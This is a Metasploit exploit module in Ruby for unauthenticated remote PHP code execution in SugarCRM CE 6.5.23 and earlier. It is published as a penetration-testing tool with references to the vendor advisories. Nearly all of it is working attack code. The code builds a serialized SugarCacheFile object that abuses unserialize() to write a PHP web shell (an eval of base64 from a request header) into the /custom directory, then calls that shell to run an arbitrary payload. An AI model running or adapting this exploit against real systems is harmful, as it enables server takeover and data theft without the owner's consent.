##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'SugarCRM REST Unserialize PHP Code Execution',
      'Description'    => %q{
        This module exploits a PHP Object Injection vulnerability in SugarCRM CE <= 6.5.23
        which could be abused to allow unauthenticated users to execute arbitrary PHP code with
        the permissions of the webserver. The dangerous unserialize() call exists in the
        '/service/core/REST/SugarRestSerialize.php' script. The exploit abuses the __destruct()
        method from the SugarCacheFile class to write arbitrary PHP code into the /custom directory.
      },
      'Author'         => 'EgiX',
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['URL', 'http://karmainsecurity.com/KIS-2016-07'],
          ['URL', 'http://www.sugarcrm.com/security/sugarcrm-sa-2016-001'],
          ['URL', 'http://www.sugarcrm.com/security/sugarcrm-sa-2016-008'],
          ['URL', 'https://bugs.php.net/bug.php?id=72663']
        ],
      'Privileged'     => false,
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        => [ ['SugarCRM CE <= 6.5.23', {}] ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 23 2016'
      ))

      register_options(
        [
          OptString.new('TARGETURI', [ true, "The base path to the web application", "/sugarcrm/"])
        ], self.class)
  end

  def exploit
    upload_php = '/custom/' + rand_text_alpha(rand(4)+8) + '.php'

    payload_serialized =  "O:+14:\"SugarCacheFile\":23:{S:17:\"\\00*\\00_cacheFileName\";"
    payload_serialized << "s:#{upload_php.length+2}:\"..#{upload_php}\";S:16:\"\\00*\\00"
    payload_serialized << "_cacheChanged\";b:1;S:14:\"\\00*\\00_localStore\";a:1:{i:0;s:55"
    payload_serialized << ":\"<?php eval(base64_decode($_SERVER['HTTP_PAYLOAD'])); ?>\";}}"

    print_status("#{peer} - Exploiting the unserialize() to upload PHP code")

    res = send_request_cgi(
    {
      'uri'    => normalize_uri(target_uri.path, 'service/v4/rest.php'),
      'method' => 'POST',
        'vars_post' => {
          'method'     => 'login',
          'input_type' => 'Serialize',
          'rest_data'  => payload_serialized
        }
    })

    if not res or res.code != 200
      print_error("#{peer} - Exploit failed: #{res.code}")
      return
    end

    register_files_for_cleanup(File.basename(upload_php))

    print_status("#{peer} - Executing the payload #{upload_php}")

    res = send_request_cgi(
    {
      'method'  => 'GET',
      'uri'     => normalize_uri(target_uri.path, upload_php),
      'headers' => { 'payload' => Rex::Text.encode_base64(payload.encoded) }
    })

    if res and res.code != 200
      print_error("#{peer} - Payload execution failed: #{res.code}")
      return
    end
  end
end
